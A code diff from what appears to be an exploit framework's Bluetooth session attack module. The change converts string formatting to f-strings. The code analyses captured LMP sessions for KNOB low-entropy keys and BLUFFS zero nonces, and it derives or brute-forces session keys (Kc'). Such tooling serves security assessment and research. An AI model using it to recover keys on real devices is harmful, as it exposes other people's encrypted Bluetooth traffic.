@@ -246,17 +246,17 @@ class Exploit(Exploit):
             print_error("pcap_file is required for analysis mode.")
             return
 
-        print_status("Parsing LMP sessions from {}...".format(self.pcap_file))
+        print_status(f"Parsing LMP sessions from {self.pcap_file}...")
         sessions = _parse_lmp_sessions_pyshark(self.pcap_file)
 
         if not sessions:
             print_error("No LMP sessions found in PCAP.")
             return
 
-        print_success("Found {} LMP sessions.".format(len(sessions)))
+        print_success(f"Found {len(sessions)} LMP sessions.")
 
         for i, session in enumerate(sessions, 1):
-            print_info("\n=== Session {} ({} LMP packets) ===".format(i, session.packet_count))
+            print_info(f"\n=== Session {i} ({session.packet_count} LMP packets) ===")
 
             if session.key_size is not None:
                 severity = "CRITICAL" if session.key_size <= 2 else (
@@ -264,28 +264,25 @@ class Exploit(Exploit):
                         "MEDIUM" if session.key_size <= 7 else "OK"
                     )
                 )
-                print_info("  Key size: {} bytes ({} bits) — {}".format(
-                    session.key_size, session.key_size * 8, severity))
+                print_info(f"  Key size: {session.key_size} bytes ({session.key_size * 8} bits) — {severity}")
             else:
                 print_info("  Key size: not negotiated in this session")
 
             if session.has_knob_indicator:
-                print_success("  [KNOB] LOW ENTROPY DETECTED — key size {} bytes".format(
-                    session.key_size))
-                print_info("  Session key can be brute-forced in {} attempts.".format(
-                    256 ** session.key_size))
+                print_success(f"  [KNOB] LOW ENTROPY DETECTED — key size {session.key_size} bytes")
+                print_info(f"  Session key can be brute-forced in {256 ** session.key_size} attempts.")
 
             if session.has_bluffs_indicator:
                 print_success("  [BLUFFS] ZERO NONCE PATTERN — AU_RAND and EN_RAND are all zeros")
                 print_info("  Session key is constant across sessions (predictable).")
 
             if session.au_rands:
-                print_info("  AU_RAND count: {}".format(len(session.au_rands)))
+                print_info(f"  AU_RAND count: {len(session.au_rands)}")
                 for j, ar in enumerate(session.au_rands):
-                    print_info("    AU_RAND[{}]: {}".format(j, ar.hex()))
+                    print_info(f"    AU_RAND[{j}]: {ar.hex()}")
 
             if session.en_rand is not None:
-                print_info("  EN_RAND: {}".format(session.en_rand.hex()))
+                print_info(f"  EN_RAND: {session.en_rand.hex()}")
 
             if session.encryption_started:
                 print_info("  Encryption: STARTED")
@@ -297,7 +294,7 @@ class Exploit(Exploit):
                 btadd = bytearray.fromhex(self.btadd_peer)
                 ent = session.key_size or 16
                 sk = kdf(lk, session.au_rands[-1], session.en_rand, btadd, ent)
-                print_info("  Computed session key (Kc'): {}".format(sk.hex()))
+                print_info(f"  Computed session key (Kc'): {sk.hex()}")
 
     def _knob_bruteforce(self) -> None:
         """Brute-force a KNOB-weakened session key."""
@@ -325,21 +322,19 @@ class Exploit(Exploit):
         en = bytearray.fromhex(self.en_rand)
         btadd = bytearray.fromhex(self.btadd_peer)
 
-        print_status("Computing session key with {}-byte entropy...".format(self.entropy))
+        print_status(f"Computing session key with {self.entropy}-byte entropy...")
         start = time.monotonic()
         sk = kdf(lk, au, en, btadd, self.entropy)
         elapsed = time.monotonic() - start
 
-        print_success("Session key (Kc'): {}".format(sk.hex()))
-        print_info("Computed in {:.3f}s with {} byte(s) of entropy.".format(
-            elapsed, self.entropy))
+        print_success(f"Session key (Kc'): {sk.hex()}")
+        print_info(f"Computed in {elapsed:.3f}s with {self.entropy} byte(s) of entropy.")
 
         effective_entropy = sum(1 for b in sk if b != 0)
-        print_info("Effective non-zero bytes in Kc': {}/16".format(effective_entropy))
+        print_info(f"Effective non-zero bytes in Kc': {effective_entropy}/16")
 
         if self.entropy <= 2:
-            print_success("[KNOB] Key is trivially brutable: {} possible values.".format(
-                256 ** self.entropy))
+            print_success(f"[KNOB] Key is trivially brutable: {256 ** self.entropy} possible values.")
 
     def _verify_session(self) -> None:
         """Verify session key against known parameters."""
@@ -360,7 +355,7 @@ class Exploit(Exploit):
         for ent in range(1, 17):
             sk = kdf(lk, au, en, btadd, ent)
             marker = " <-- KNOB target" if ent <= 2 else ""
-            print_info("  L={:2d}: {}{}".format(ent, sk.hex(), marker))
+            print_info(f"  L={ent:2d}: {sk.hex()}{marker}")
 
         if au == ZERO_16 and en == ZERO_16:
             print_success("[BLUFFS] Both nonces are zero — session key is constant!")
@@ -424,10 +419,10 @@ class Exploit(Exploit):
 
         if self.dry_run:
             print_info("BT Session Attack Configuration:")
-            print_info("  Mode:        {}".format(self.attack))
+            print_info(f"  Mode:        {self.attack}")
             print_info("  PCAP:        {}".format(self.pcap_file or "(none)"))
             print_info("  Link key:    {}".format(self.link_key[:8] + "..." if self.link_key else "(none)"))
-            print_info("  Entropy:     {} bytes".format(self.entropy))
+            print_info(f"  Entropy:     {self.entropy} bytes")
             return
 
         if self.attack == "analyze":
@@ -439,5 +434,4 @@ class Exploit(Exploit):
         elif self.attack == "assess_device":
             self._assess_device()
         else:
-            print_error("Unknown mode: {}. Use: analyze | knob_bruteforce | verify_session | assess_device".format(
-                self.attack))
+            print_error(f"Unknown mode: {self.attack}. Use: analyze | knob_bruteforce | verify_session | assess_device")
